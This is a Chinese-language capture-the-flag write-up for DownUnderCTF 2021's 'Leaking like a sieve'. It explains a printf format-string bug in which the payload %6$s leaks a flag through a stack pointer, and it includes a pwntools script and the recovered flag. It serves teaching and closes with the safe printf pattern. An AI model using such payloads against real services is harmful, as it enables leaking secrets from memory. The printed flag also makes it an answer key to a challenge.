# DownUnderCTF 2021 - Leaking like a sieve

## 题目简述

程序先把 `flag.txt` 读入栈上的 `char flag[32]`，同时保存局部指针 `flag_ptr = flag`。随后循环读取用户名并直接执行 `printf(name)`。用户输入因此被当作格式字符串解释，可以让 `printf` 从参数寄存器保存区和栈上取值，形成任意位置读取。

## 解题过程

漏洞点与目标数据在同一函数栈帧中：

```c
char name[32];
char flag[32];
char *flag_ptr = flag;

fgets(flag, sizeof(flag), file);
fgets(name, sizeof(name), stdin);
printf(name);
```

可以先提交一组指针格式来确认栈布局：

```text
%p.%p.%p.%p.%p.%p.%p.%p
```

对提供的二进制，`flag_ptr` 位于格式参数索引 6。`%6$s` 会把第 6 个取出的值解释为 `char *`，并从该地址持续输出字符串，正好泄露 `flag`：

```text
What is your name?
%6$s

Hello there, DUCTF{f0rm4t_5p3c1f13r_m3dsg!}
```

脚本化交互只需发送这一行：

```python
from pwn import remote

io = remote(HOST, PORT)
io.sendlineafter(b"name?\n", b"%6$s")
print(io.recvline().decode())
```

## 方法总结

`printf(user_input)` 与安全的 `printf("%s", user_input)` 完全不同：前者允许用户控制格式说明符。`%n$p` 适合枚举槽位，确认某个槽位是有效字符串指针后再换成 `%n$s`。参数索引受编译器和栈布局影响，不应把 `%6$s` 当成所有同类程序的固定答案。
